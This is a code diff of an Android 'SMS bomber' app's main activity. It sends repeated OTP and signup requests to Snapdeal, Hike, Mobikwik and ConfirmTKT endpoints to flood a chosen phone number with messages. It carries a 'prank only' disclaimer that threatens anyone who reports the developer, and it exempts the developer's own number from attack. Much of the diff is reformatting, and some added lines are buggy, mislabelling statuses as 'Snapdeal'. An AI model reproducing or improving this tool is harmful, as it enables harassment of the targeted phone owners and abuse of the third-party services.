@@ -8,11 +8,10 @@ import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.Uri;
 import android.os.AsyncTask;
+import android.os.Bundle;
 import android.provider.ContactsContract;
 import android.support.v7.app.AppCompatActivity;
-import android.os.Bundle;
 import android.text.Html;
-import android.util.Log;
 import android.view.Menu;
 import android.view.MenuInflater;
 import android.view.MenuItem;
@@ -41,9 +40,9 @@ public class MainActivity extends AppCompatActivity {
 
     private static final String TAG = "MainActivity";
     private static final int REQUEST_CONTACT_NUMBER = 32;
-    String mPhoneNumber ,mLog;
+    String mPhoneNumber, mLog;
     EditText mPhoneEt;
-    TextView mStatusTV ,mLogTV;
+    TextView mStatusTV, mLogTV;
     LinearLayout mPhoneLayout;
     AdRequest adRequest;
 
@@ -58,15 +57,32 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
 
         if (!isNetworkAvailable()) {
-            Toast.makeText(this, "Please connect to network", Toast.LENGTH_SHORT).show();
+            addLog("#FF0000", "Please connect to network");
             return;
         }
+
+        new AwesomeNoticeDialog(this)
+                .setTitle("Warning")
+                .setMessage("I(Developer of this app) is not responcible for any thing you did with this app. This app is only for prank. If you are not agree with my term and condition please don't use this app. In case you report my app or me i can take action to you.")
+                .setColoredCircle(R.color.dialogWarningBackgroundColor)
+                .setDialogIconAndColor(R.drawable.ic_dialog_warning, R.color.white)
+                .setCancelable(true)
+                .setButtonText(getString(R.string.dialog_ok_button))
+                .setButtonBackgroundColor(R.color.dialogWarningBackgroundColor)
+                .setButtonText(getString(R.string.dialog_ok_button))
+                .setNoticeButtonClick(new Closure() {
+                    @Override
+                    public void exec() {
+
+                    }
+                })
+                .show();
 
         AdView adView = findViewById(R.id.mainBottomBannerAd);
         adRequest = new AdRequest.Builder().build();
         adView.loadAd(adRequest);
 
-        MobileAds.initialize(this,"ca-app-pub-8086732239748075~8890173650");
+        MobileAds.initialize(this, "ca-app-pub-8086732239748075~8890173650");
 
         interstitialAd = new InterstitialAd(this);
         interstitialAd.setAdUnitId("ca-app-pub-8086732239748075/9598708915");
@@ -85,15 +101,20 @@ public class MainActivity extends AppCompatActivity {
             public void onClick(View v) {
                 mPhoneNumber = mPhoneEt.getText().toString();
 
-                if (interstitialAd.isLoaded()){
+                if (!isNetworkAvailable()) {
+                    addLog("#FF0000", "Please connect to network");
+                    return;
+                }
+
+                if (interstitialAd.isLoaded()) {
                     interstitialAd.show();
-                }else {
-                    addLog("#FFFF33","Please wait 10-15 second. Server is busy.");
+                } else {
+                    addLog("#FFFF33", "Please wait 10-15 second. Server is busy.");
                     return;
                 }
 
                 if (isDeveloperNumber(mPhoneNumber)) {
-                    addLog("#FF0000","Bombing on creator of this app does not make sense.");
+                    addLog("#FF0000", "Bombing on creator of this app does not make sense.");
                     return;
                 }
 
@@ -105,6 +126,12 @@ public class MainActivity extends AppCompatActivity {
         findViewById(R.id.contactBtn).setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
+
+                if (!isNetworkAvailable()) {
+                    addLog("#FF0000", "Please connect to network");
+                    return;
+                }
+
                 Intent intent = new Intent(Intent.ACTION_PICK, ContactsContract.CommonDataKinds.Phone.CONTENT_URI);
                 startActivityForResult(intent, REQUEST_CONTACT_NUMBER);
             }
@@ -118,7 +145,7 @@ public class MainActivity extends AppCompatActivity {
 
             @Override
             public void onAdFailedToLoad(int errorCode) {
-                Toast.makeText(MainActivity.this, "Error code : "+errorCode, Toast.LENGTH_SHORT).show();
+                Toast.makeText(MainActivity.this, "Error code : " + errorCode, Toast.LENGTH_SHORT).show();
             }
 
             @Override
@@ -143,13 +170,13 @@ public class MainActivity extends AppCompatActivity {
 
     private boolean isDeveloperNumber(String phoneNumber) {
 
-        phoneNumber = phoneNumber.replace(" ","");
+        phoneNumber = phoneNumber.replace(" ", "");
         char[] number = phoneNumber.toCharArray();
         char[] myNumber = "9664769226".toCharArray();
 
 
         for (int i = 0; i < 10; i++) {
-            if (number[i] != myNumber[i]){
+            if (number[i] != myNumber[i]) {
                 return false;
             }
         }
@@ -157,29 +184,6 @@ public class MainActivity extends AppCompatActivity {
         return true;
     }
 
-
-    @Override
-    protected void onStart() {
-        super.onStart();
-
-        new AwesomeNoticeDialog(this)
-                .setTitle("Warning")
-                .setMessage("I(Developer of this app) is not responcible for any thing you did with this app. This app is only for prank. If you are not agree with my term and condition please don't use this app. In case you report my app or me i can take action to you.")
-                .setColoredCircle(R.color.dialogWarningBackgroundColor)
-                .setDialogIconAndColor(R.drawable.ic_dialog_warning, R.color.white)
-                .setCancelable(true)
-                .setButtonText(getString(R.string.dialog_ok_button))
-                .setButtonBackgroundColor(R.color.dialogWarningBackgroundColor)
-                .setButtonText(getString(R.string.dialog_ok_button))
-                .setNoticeButtonClick(new Closure() {
-                    @Override
-                    public void exec() {
-
-                    }
-                })
-                .show();
-
-    }
 
     @SuppressWarnings("UnusedAssignment")
     @SuppressLint("StaticFieldLeak")
@@ -206,15 +210,20 @@ public class MainActivity extends AppCompatActivity {
                     ((Ason) localObject2).put("mobileNumber", mPhoneNumber);
                     try {
                         localObject2 = Bridge.post("https://mobileapi.snapdeal.com/service/user/signUpWithMobileOnly"
-                                , new Object[0]).header("v", "6.1.9").header("api_key", "snapdeal").header("User-Agent", "android")
+                                , new Object[0]).header("v", "6.1.9")
+                                .header("api_key", "snapdeal")
+                                .header("User-Agent", "android")
                                 .body((Ason) localObject2).request().response();
 
-                        String code = localObject2.toString();
+                        final int code = Integer.parseInt(localObject2.toString().substring(0, 3));
 
                         runOnUiThread(new Runnable() {
                             @Override
                             public void run() {
-                                mStatusTV.setText("Snapdeal");
+                                if (code == 200) {
+                                    mStatusTV.setText("Snapdeal");
+                                    addLog("00AA00", "Bombing with Snapdeal");
+                                }
                             }
                         });
 
@@ -224,7 +233,6 @@ public class MainActivity extends AppCompatActivity {
 
                 }
             }).start();
-
             return null;
         }
 
@@ -232,7 +240,6 @@ public class MainActivity extends AppCompatActivity {
         protected void onPostExecute(Void aVoid) {
             super.onPostExecute(aVoid);
             new HikeBomb().execute();
-
         }
     }
 
@@ -257,10 +264,16 @@ public class MainActivity extends AppCompatActivity {
                     try {
                         localObject = Bridge.post("http://api.im.hike.in/v3/account/validate?digits=4").body((Ason) localObject).request().response();
 
+                        final int code = Integer.parseInt(localObject.toString().substring(0, 3));
+
                         runOnUiThread(new Runnable() {
                             @Override
                             public void run() {
                                 mStatusTV.setText("Hike");
+                                if (code == 200) {
+                                    mStatusTV.setText("Snapdeal");
+                                    addLog("00AA00", "Bombing with Hike");
+                                }
                             }
                         });
                     } catch (BridgeException e) {
@@ -300,13 +313,21 @@ public class MainActivity extends AppCompatActivity {
                     try {
                         localObject1 = Bridge.post("https://appapi.mobikwik.com/p/account/otp/cell", new Object[0])
                                 .header("User-Agent", "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G920I Build/NRD90M")
-                                .header("X-App-Ver", "1").header("X-MClient", "3").body((Ason) localObject1).request().response();
-                        Log.d(TAG, "run: "+localObject1.toString());
+                                .header("X-App-Ver", "1")
+                                .header("X-MClient", "3")
+                                .body((Ason) localObject1).request().response();
+
+                        final int code = Integer.parseInt(localObject1.toString().substring(0, 3));
+
                         if (localObject1.toString() == "200") {
                             runOnUiThread(new Runnable() {
                                 @Override
                                 public void run() {
                                     mStatusTV.setText("Mobikwick");
+                                    if (code == 200) {
+                                        mStatusTV.setText("Snapdeal");
+                                        addLog("00AA00", "Bombing with Mobikwick");
+                                    }
                                 }
                             });
                         }
@@ -359,6 +380,8 @@ public class MainActivity extends AppCompatActivity {
                             webView.loadUrl("https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + mPhoneNumber);
                             webView.setWebViewClient(new WebViewClient());
                             mStatusTV.setText("ConfirmTKT");
+                            addLog("00AA00", "Bombing with ConfirmTKT");
+
                         }
                     });
 
@@ -379,25 +402,25 @@ public class MainActivity extends AppCompatActivity {
     @Override
     public boolean onCreateOptionsMenu(Menu menu) {
         MenuInflater inflater = getMenuInflater();
-        inflater.inflate(R.menu.overflow,menu);
+        inflater.inflate(R.menu.overflow, menu);
         return super.onCreateOptionsMenu(menu);
     }
 
     @Override
     public boolean onOptionsItemSelected(MenuItem item) {
 
-        switch (item.getItemId()){
-            case R.id.menuAbout:{
-                addLog("#0000FF","Created by kartik");
+        switch (item.getItemId()) {
+            case R.id.menuAbout: {
+                addLog("#0000FF", "Created by Spidy0471");
                 return true;
             }
 
-            case R.id.menuWeb:{
+            case R.id.menuWeb: {
                 Toast.makeText(this, "Website is under contruction", Toast.LENGTH_SHORT).show();
-                //Todo parse through the website deucate.co
                 return true;
             }
-            default:{
+
+            default: {
                 return super.onOptionsItemSelected(item);
             }
         }
@@ -426,7 +449,7 @@ public class MainActivity extends AppCompatActivity {
             }
 
             if (isDeveloperNumber(mPhoneNumber)) {
-                addLog("#FF0000","Bombing on creator of this app dosen't make sence. :(");
+                addLog("#FF0000", "Bombing on creator of this app dosen't make sence. :(");
                 return;
             }
             mPhoneNumber = numberT;
@@ -437,8 +460,8 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
-    private void addLog(String color,String log){
-        String newLog = "<font color='"+color+"'>"+log+"</font>";
+    private void addLog(String color, String log) {
+        String newLog = "<font color='" + color + "'>" + log + "</font>";
         mLog += "<br/>> " + newLog;
         mLogTV.setText(Html.fromHtml(mLog));
     }
